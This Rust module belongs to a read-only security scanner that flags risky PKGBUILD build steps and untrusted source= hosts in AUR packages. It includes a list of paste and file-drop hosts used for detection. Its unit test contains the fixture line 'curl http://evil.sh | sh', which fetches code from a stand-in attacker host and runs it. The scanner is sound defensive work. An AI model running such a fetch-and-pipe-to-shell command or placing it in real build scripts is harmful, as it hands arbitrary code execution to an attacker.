//! Arch `PKGBUILD` (AUR) build-step risks. PKGBUILD functions run as shell
//! during `makepkg`, so installing an AUR package *is* code execution, and the
//! AUR is unreviewed. Read-only: husk never runs `makepkg`/`yay`/`paru`.

use super::util::{dangerous_command_reason, find_line, trim_evidence};
use super::{Check, CheckContext};
use crate::model::{Finding, Severity};
use crate::rule::{Category, Rule, RuleId};
use std::borrow::Cow;

pub struct Pkgbuild;

static RULES: &[Rule] = &[
    Rule {
        id: RuleId::lit("pkgbuild-risky-build"),
        title: Cow::Borrowed("Risky PKGBUILD build step"),
        category: Category::LifecycleScript,
        default_severity: Severity::High,
        rationale: Cow::Borrowed(
            "AUR PKGBUILD steps run as shell during makepkg, so this executes \
             when the package is built or installed.",
        ),
    },
    Rule {
        id: RuleId::lit("pkgbuild-untrusted-source"),
        title: Cow::Borrowed("PKGBUILD fetches from an untrusted source"),
        category: Category::LifecycleScript,
        default_severity: Severity::Medium,
        rationale: Cow::Borrowed(
            "A source= entry over plaintext HTTP or from a paste/file-drop host \
             is a common AUR compromise vector.",
        ),
    },
];

/// Detect a `source=` entry that fetches over plaintext HTTP or from a
/// paste/file-drop host. Returns the offending value as evidence.
fn suspicious_pkgbuild_source(contents: &str) -> Option<String> {
    const RISKY_HOSTS: [&str; 6] = [
        "pastebin.com",
        "paste.",
        "anonfiles",
        "transfer.sh",
        "bit.ly",
        "tinyurl",
    ];
    let mut in_source = false;
    for line in contents.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("source") && trimmed.contains('=') {
            in_source = true;
        }
        if in_source {
            if trimmed.contains("http://") {
                return Some(format!("plaintext HTTP source: {}", trim_evidence(trimmed)));
            }
            if let Some(host) = RISKY_HOSTS.iter().find(|h| trimmed.contains(**h)) {
                return Some(format!("untrusted host {host}: {}", trim_evidence(trimmed)));
            }
            if trimmed.ends_with(')') {
                in_source = false;
            }
        }
    }
    None
}

impl Check for Pkgbuild {
    fn rules(&self) -> &'static [Rule] {
        RULES
    }
    fn applies(&self, ctx: &CheckContext) -> bool {
        ctx.file_name() == "PKGBUILD"
    }
    fn run(&self, ctx: &CheckContext, out: &mut Vec<Finding>) {
        let path = ctx.path;
        let contents = ctx.contents;
        for (index, line) in contents.lines().enumerate() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }
            if let Some(reason) = dangerous_command_reason(trimmed) {
                out.push(
                    Finding::from_rule("pkgbuild-risky-build")
                        .id("pkgbuild")
                        .source("Husk PKGBUILD scanner")
                        .at(path.to_path_buf(), Some(index + 1))
                        .summary(
                            "AUR PKGBUILD steps run as shell during makepkg, so this executes when the package is built or installed.",
                        )
                        .evidence(format!("{reason}: {}", trim_evidence(trimmed)))
                        .recommend(
                            "Read the PKGBUILD before installing. AUR packages are unreviewed and run arbitrary shell. Prefer an official repo package if one exists.",
                        ),
                );
            }
        }
        if let Some(evidence) = suspicious_pkgbuild_source(contents) {
            out.push(
                Finding::from_rule("pkgbuild-untrusted-source")
                    .id("pkgbuild-source")
                    .source("Husk PKGBUILD scanner")
                    .at(path.to_path_buf(), find_line(contents, "source="))
                    .summary(
                        "A source= entry pulls build inputs over plaintext HTTP or from a paste/file-drop host, a common AUR compromise vector.",
                    )
                    .evidence(evidence)
                    .recommend(
                        "Verify every source= URL and its checksum in the PKGBUILD before building.",
                    ),
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn run(contents: &str) -> Vec<Finding> {
        let mut out = Vec::new();
        Pkgbuild.run(
            &CheckContext::new(Path::new("/x/PKGBUILD"), contents),
            &mut out,
        );
        out
    }

    #[test]
    fn flags_curl_build_step() {
        let f = run("build() {\n  curl http://evil.sh | sh\n}\n");
        assert!(f.iter().any(|f| f.category == Category::LifecycleScript));
        assert!(
            f.iter()
                .any(|f| f.rule_id.as_ref().unwrap().as_str() == "pkgbuild-risky-build")
        );
    }
}
